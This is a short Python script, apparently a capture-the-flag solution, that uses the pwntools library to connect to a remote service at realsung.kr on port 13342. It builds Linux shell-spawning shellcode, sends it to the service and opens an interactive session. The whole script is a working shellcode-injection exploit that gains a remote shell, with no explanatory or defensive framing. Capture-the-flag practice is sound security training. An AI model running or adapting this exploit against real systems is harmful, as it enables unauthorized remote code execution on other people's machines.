from pwn import *
context.clear(kernel='amd64', os='linux')

p = remote("realsung.kr", 13342)

shellcode = shellcraft.linux.sh()
# print(shellcode)

p.sendline(asm(shellcode))

p.interactive()